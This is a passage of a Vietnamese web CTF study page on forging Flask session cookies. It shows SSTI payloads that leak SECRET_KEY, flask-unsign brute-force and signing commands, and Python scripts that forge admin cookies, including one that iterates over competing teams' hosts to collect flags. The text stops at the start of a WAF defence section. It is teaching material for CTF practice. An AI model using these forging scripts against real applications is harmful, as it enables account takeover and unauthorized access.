@@ -1,0 +1,542 @@
+<title>Session &amp; Cookie Forge — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Auth, Session &amp; Crypto</div>
+    <h1>Session &amp; Cookie Forge</h1>
+    <p class="sub">Nhiều framework (đặc biệt Flask) lưu session <strong>ngay trong cookie</strong> (không lưu ở
+    server), chỉ ký để chống sửa. Nếu bạn tìm ra được khóa ký bí mật (SECRET_KEY) — qua rò rỉ, đoán yếu, hoặc lấy
+    từ 1 lỗ hổng khác (SSTI, LFI) — bạn tự "giả mạo" được session bất kỳ, kể cả của admin, mà không cần mật khẩu.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Session Forge là gì, để làm gì?</h2>
+  <p class="lead">Flask (và một số framework khác) mặc định lưu toàn bộ session <strong>ngay trong cookie</strong>
+  phía trình duyệt (khác với kiểu session truyền thống chỉ lưu 1 ID ngắn, dữ liệu thật nằm ở server). Để chống
+  bạn tự sửa cookie, Flask <strong>ký</strong> nó bằng 1 khóa bí mật (<code>SECRET_KEY</code>) app tự cấu hình.
+  Nếu bạn biết được <code>SECRET_KEY</code> đó (bằng cách nào cũng được — rò rỉ qua lỗi khác, đoán ra, hoặc brute-force
+  nếu yếu), bạn có thể tự tạo 1 cookie session <strong>mới hoàn toàn</strong> với bất kỳ nội dung nào (vd
+  <code>{"user":"admin","logged_in":true}</code>), ký đúng bằng khóa đó, và server sẽ tin là hợp lệ.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Cookie session Flask có dạng <code>eyJ....XXXX.YYYY</code> (giống cấu trúc JWT nhưng KHÔNG phải JWT — đây là
+  định dạng riêng của thư viện <code>itsdangerous</code>). Phần đầu là Base64 của dữ liệu (đọc được ngay, không
+  cần khóa) — phần sau là chữ ký. Việc cần làm luôn là: tìm ra <code>SECRET_KEY</code>, rồi tự ký lại dữ liệu
+  bạn muốn.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ SESSION / COOKIE FORGE</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Cookie tên <code>session</code> có dạng <code>eyJ....XXXXXXXX.YYYYYYYY</code> (2 dấu chấm, phần đầu
+        Base64 decode ra JSON) ⟹ chắc chắn là Flask session (itsdangerous).
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Cần biết <code>SECRET_KEY</code> — tìm qua: SSTI (<code>{{config}}</code>, xem bài SSTI), LFI đọc file
+        config, brute-force bằng wordlist (nếu secret yếu kiểu CTF tự dựng), hoặc đôi khi secret mặc định/ví dụ
+        trong docs bị để nguyên.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng flask-unsign</span>
+        <code>flask-unsign --decode --cookie "eyJ..."</code> — đọc nội dung ngay không cần khóa.
+        <code>flask-unsign --unsign --cookie "eyJ..." --wordlist secrets.txt</code> — brute-force khóa.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># Đã có SECRET_KEY = "supersecret123" -- tự ký cookie admin</span>
+flask-unsign --sign --cookie <span class="s">"{'user': 'admin', 'logged_in': True}"</span> --secret <span class="s">"supersecret123"</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">from</span> flask.sessions <span class="k">import</span> SecureCookieSessionInterface
+<span class="k">import</span> re, requests
+
+<span class="k">class</span> <span class="d">App</span>:
+    secret_key = <span class="s">"supersecret123"</span>
+
+cookie = SecureCookieSessionInterface().get_signing_serializer(App()).dumps(
+    {<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"logged_in"</span>: <span class="k">True</span>})
+
+r = requests.get(<span class="s">"http://TARGET/admin"</span>, cookies={<span class="s">"session"</span>: cookie})
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, r.text).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Chưa có SECRET_KEY → quay lại bài SSTI (lộ qua <code>{{config}}</code>) hoặc LFI (đọc file cấu hình) trước.
+        WAF <strong>không chặn được</strong> cookie giả bằng regex (trông y hệt cookie thật, chỉ khác nội dung đã
+        giải mã). Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Server-side session vs Client-side session</b> — kiểu truyền thống: server tự lưu dữ liệu
+  session (trong RAM/database), chỉ gửi cho trình duyệt 1 <strong>ID ngắn</strong> để tra cứu. Kiểu Flask mặc
+  định: <strong>toàn bộ dữ liệu session nằm ngay trong cookie</strong>, server không lưu gì cả — chỉ ký để biết
+  cookie chưa bị sửa.</div>
+  <div class="def"><b>SECRET_KEY</b> — khóa bí mật app Flask dùng để ký (và chỉ để ký, không mã hóa) session
+  cookie. Đây là cấu hình <strong>app tự đặt</strong> lúc code (<code>app.secret_key = "..."</code>), không phải
+  mật khẩu riêng từng user.</div>
+  <div class="def"><b>itsdangerous</b> — thư viện Flask dùng để ký/giải ký session, thuật toán mặc định HMAC
+  (giống cơ chế JWT về bản chất — ký bằng khóa đối xứng — nhưng định dạng chuỗi khác JWT).</div>
+  <p>Code Flask hay viết:</p>
+  <pre><code><span class="k">from</span> flask <span class="k">import</span> Flask, session
+app = Flask(__name__)
+app.secret_key = <span class="s">"dev"</span>   <span class="c"># !! hay bị để yếu/mặc định trong môi trường CTF</span>
+
+<span class="nd">@app.route</span>(<span class="s">"/login"</span>)
+<span class="k">def</span> <span class="d">login</span>():
+    session[<span class="s">"user"</span>] = <span class="s">"guest"</span>
+    session[<span class="s">"logged_in"</span>] = <span class="k">True</span></code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Ai biết khóa, người đó tự ký được bất cứ gì</h2>
+  <p>Toàn bộ an toàn của cơ chế này phụ thuộc <strong>duy nhất</strong> vào việc giữ bí mật <code>SECRET_KEY</code>.
+  Khi bạn biết khóa đó (bằng bất kỳ cách nào), bạn có đủ mọi thứ cần để tự ký 1 session mới — về mặt toán học,
+  server <strong>không có cách nào phân biệt</strong> cookie do chính nó tạo ra với cookie do bạn tự tạo, miễn
+  bạn dùng đúng khóa.</p>
+  <p>Vấn đề thực tế trong CTF: môi trường dựng nhanh hay để <code>SECRET_KEY</code> <strong>yếu</strong> (chuỗi
+  ngắn, dễ đoán như "dev", "secret", "changeme") hoặc <strong>vô tình để lộ</strong> qua 1 lỗ hổng khác (SSTI đọc
+  được biến <code>config</code> toàn cục của Flask, trong đó luôn có <code>SECRET_KEY</code>; hoặc LFI đọc được
+  file source chứa dòng <code>app.secret_key = "..."</code>).</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Cấu trúc cookie session Flask</h2>
+  <div class="pbreak">
+    <div class="ph">eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJndWVzdCJ9.ZYZ123.AbCdEf1234567890</div>
+    <div class="pb">
+      <div class="part"><strong>Phần 1</strong> (<code>eyJsb2dnZWRfaW4i...</code>) — Base64 của JSON dữ liệu
+      session, vd <code>{"logged_in":true,"user":"guest"}</code>. <strong>Ai cũng decode được</strong>, không cần
+      khóa.</div>
+      <div class="part"><strong>Phần 2</strong> (<code>ZYZ123</code>) — timestamp (thời điểm ký), dùng để kiểm
+      tra hết hạn.</div>
+      <div class="part"><strong>Phần 3</strong> (<code>AbCdEf1234567890</code>) — chữ ký HMAC, tính từ phần 1+2
+      và <code>SECRET_KEY</code>. Đây là phần <strong>duy nhất</strong> cần biết khóa mới tính lại được đúng.</div>
+    </div>
+    <div class="resp"><b>Vì sao giả được:</b> nếu biết <code>SECRET_KEY</code>, bạn tự soạn JSON mới (vd
+    <code>{"logged_in":true,"user":"admin"}</code>), rồi dùng ĐÚNG thuật toán của <code>itsdangerous</code>
+    (không phải tự nghĩ ra thuật toán — dùng chính thư viện Flask, xem mục 06) để tính lại chữ ký cho đúng.</div>
+  </div>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr11)}
+    </style>
+    <defs><marker id="arr11" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="195" height="65" rx="10" class="box-a"/>
+    <text x="22" y="38" class="lbl-m">Bạn tự soạn JSON mới:</text>
+    <text x="22" y="54" class="lbl-a">{"user":"admin",</text>
+    <text x="22" y="68" class="lbl-a">"logged_in":true}</text>
+
+    <path d="M215,52 H253" class="arrow"/>
+    <rect x="258" y="20" width="195" height="65" rx="10" class="box"/>
+    <text x="270" y="38" class="lbl-m">Ký bằng itsdangerous</text>
+    <text x="270" y="54" class="lbl">+ SECRET_KEY đã biết</text>
+    <text x="270" y="68" class="lbl-a">-&gt; chữ ký ĐÚNG CHUẨN</text>
+
+    <path d="M453,52 H490" class="arrow"/>
+    <rect x="495" y="20" width="175" height="65" rx="10" class="box-a"/>
+    <text x="507" y="38" class="lbl-m">Gửi cookie giả tới server</text>
+    <text x="507" y="54" class="lbl-a">-&gt; server verify PASS</text>
+    <text x="507" y="68" class="lbl-a">(vì ký đúng khóa thật)</text>
+  </svg>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Cookie tên <code>session</code>, dạng <code>eyJ....xxx.yyy</code> (2 dấu chấm)</td><td>Flask session (itsdangerous) — khác JWT (JWT cũng 2 dấu chấm nhưng cấu trúc phần đầu khác, decode ra header riêng)</td></tr>
+    <tr><td>Có SSTI (xem bài riêng) và thử <code>{{config}}</code></td><td>Thường lộ luôn <code>SECRET_KEY</code> trong biến config toàn cục</td></tr>
+    <tr><td>Có LFI/`.git` leak đọc được file khởi tạo app (<code>app.py</code>, <code>config.py</code>)</td><td>Tìm dòng <code>secret_key</code>/<code>SECRET_KEY</code> trực tiếp trong source</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — lấy cookie, giải mã xem nội dung</span>
+  <ol style="margin:4px 0 0">
+    <li>Đăng nhập tài khoản thường, Burp bắt request, xem header <code>Cookie: session=...</code>.</li>
+    <li>Copy giá trị cookie, chạy <code>flask-unsign --decode --cookie "..."</code> (mục 07) để xem cấu trúc JSON
+    thật — biết chính xác tên field cần sửa (<code>user</code>, <code>logged_in</code>, <code>role</code>...).</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Bước 3 — thay cookie đã forge vào request</span>
+  Sau khi có cookie mới (từ flask-unsign hoặc script Python mục 08), sửa trực tiếp header <code>Cookie</code>
+  trong Repeater bằng giá trị mới, Send, kiểm tra Response đã có quyền admin chưa.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO TÌNH HUỐNG</div>
+  <h2>3 cách lấy được SECRET_KEY</h2>
+
+  <h3>A. Qua SSTI (xem bài SSTI riêng) <span class="badge easy">nhanh nhất nếu có SSTI</span></h3>
+  <pre><code>{{config}}
+{{config.items()}}
+{{config['SECRET_KEY']}}</code></pre>
+
+  <h3>B. Qua LFI/source leak</h3>
+  <p>Đọc file khởi tạo app bằng <code>php://filter</code> tương tự (nếu Python cũng có LFI tương đương) hoặc trực
+  tiếp nếu BTC cấp source — tìm dòng <code>app.secret_key = "..."</code> hoặc <code>app.config['SECRET_KEY'] = "..."</code>.</p>
+
+  <h3>C. Brute-force bằng wordlist (khi secret là từ/chuỗi thông dụng)</h3>
+  <pre><code>flask-unsign --unsign --cookie <span class="s">"eyJ..."</span> --wordlist /usr/share/wordlists/rockyou.txt</code></pre>
+  <div class="note warn"><span class="tag">Thành thật về giới hạn</span>Brute-force chỉ khả thi nếu secret đủ
+  "thông dụng" để nằm trong wordlist (vd tên challenge, "secret", "flask", "ctf2026"...). Secret ngẫu nhiên đủ
+  dài thì không brute-force nổi — bắt buộc phải tìm qua rò rỉ (A hoặc B).</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: FLASK-UNSIGN</div>
+  <h2>Không muốn tự viết code ký cookie? Dùng flask-unsign</h2>
+  <div class="def"><b>flask-unsign</b> — công cụ chuyên dụng: decode cookie (không cần khóa), brute-force khóa
+  bằng wordlist, và ký lại cookie mới khi đã biết khóa — làm cả 3 việc chỉ bằng dòng lệnh, không cần tự import
+  thư viện Flask. Đã cài qua <code>pip install flask-unsign</code> (gói PyPI chính chủ, khác hẳn vụ "commix" giả
+  mạo đã gặp ở bài Command Injection — flask-unsign là công cụ thật, tác giả Lix/shevron, rất phổ biến trong CTF).</div>
+  <pre><code><span class="c"># Decode — xem nội dung, không cần biết khóa</span>
+flask-unsign --decode --cookie <span class="s">"eyJsb2dnZWRfaW4iOnRydWV9.ZYZ123.AbCdEf"</span>
+
+<span class="c"># Brute-force khóa bằng wordlist có sẵn (thử trước, nếu secret yếu)</span>
+flask-unsign --unsign --cookie <span class="s">"eyJ..."</span> --wordlist ~/hoc/CTF/Tools/web/jwt_tool/jwt-common.txt
+
+<span class="c"># Đã có khóa -- tự ký cookie mới với nội dung tùy ý</span>
+flask-unsign --sign --cookie <span class="s">"{'user': 'admin', 'logged_in': True}"</span> --secret <span class="s">"khoa_da_tim_duoc"</span></code></pre>
+  <div class="note tip"><span class="tag">Tái dùng wordlist</span>Wordlist <code>jwt-common.txt</code> của
+  <code>jwt_tool</code> (bài JWT) cũng hợp dùng để brute-force Flask secret — cả hai đều là "đoán chuỗi bí mật
+  ngắn/thông dụng", không cần wordlist riêng.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+  <div class="note"><span class="tag">Cần cài Flask</span><code>pip install flask</code> — thư viện
+  <code>itsdangerous</code> đi kèm sẵn khi cài Flask, dùng để tự ký cookie đúng chuẩn mà không cần gọi công cụ
+  ngoài trong script.</div>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">from</span> flask.sessions <span class="k">import</span> SecureCookieSessionInterface
+<span class="k">import</span> requests
+
+SECRET = <span class="s">"khoa_da_tim_duoc"</span>
+
+<span class="k">class</span> <span class="d">FakeApp</span>:
+    secret_key = SECRET
+
+serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
+cookie = serializer.dumps({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"logged_in"</span>: <span class="k">True</span>})
+<span class="k">print</span>(<span class="s">"Cookie giả:"</span>, cookie)
+
+r = requests.get(<span class="s">"http://TARGET/admin"</span>, cookies={<span class="s">"session"</span>: cookie})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+<span class="k">from</span> flask.sessions <span class="k">import</span> SecureCookieSessionInterface
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+SECRET = <span class="s">"khoa_da_tim_duoc"</span>
+
+<span class="k">class</span> <span class="d">FakeApp</span>:
+    secret_key = SECRET
+
+<span class="k">def</span> <span class="d">exploit_session</span>(host):
+    serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
+    cookie = serializer.dumps({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"logged_in"</span>: <span class="k">True</span>})
+    r = requests.get(<span class="s">f"http://{host}/admin"</span>, cookies={<span class="s">"session"</span>: cookie}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_session(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+<span class="k">from</span> flask.sessions <span class="k">import</span> SecureCookieSessionInterface
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+SECRET = <span class="s">"khoa_da_tim_duoc"</span>   <span class="c"># giống nhau mọi đội vì cùng service, hardcode trong source</span>
+
+<span class="k">class</span> <span class="d">FakeApp</span>:
+    secret_key = SECRET
+
+<span class="k">def</span> <span class="d">exploit_session</span>(host):
+    <span class="k">try</span>:
+        serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
+        cookie = serializer.dumps({<span class="s">"user"</span>: <span class="s">"admin"</span>, <span class="s">"logged_in"</span>: <span class="k">True</span>})
+        r = requests.get(<span class="s">f"http://{host}/admin"</span>, cookies={<span class="s">"session"</span>: cookie}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_session(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service Flask, có chức năng tìm kiếm dính SSTI (đã khai thác ở bài SSTI).</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Lộ SECRET_KEY</div><div class="d"><code>{{config['SECRET_KEY']}}</code> → Response hiện <code>"a1b2c3-dev-secret-key"</code>.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Giải mã cookie hiện tại</div><div class="d"><code>flask-unsign --decode --cookie "..."</code> → thấy cấu trúc <code>{"user":"guest","logged_in":true}</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tự ký cookie admin</div><div class="d"><code>flask-unsign --sign --cookie "{'user':'admin','logged_in':True}" --secret "a1b2c3-dev-secret-key"</code> → ra cookie mới.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Dùng cookie mới gọi <code>/admin</code> → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">6</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
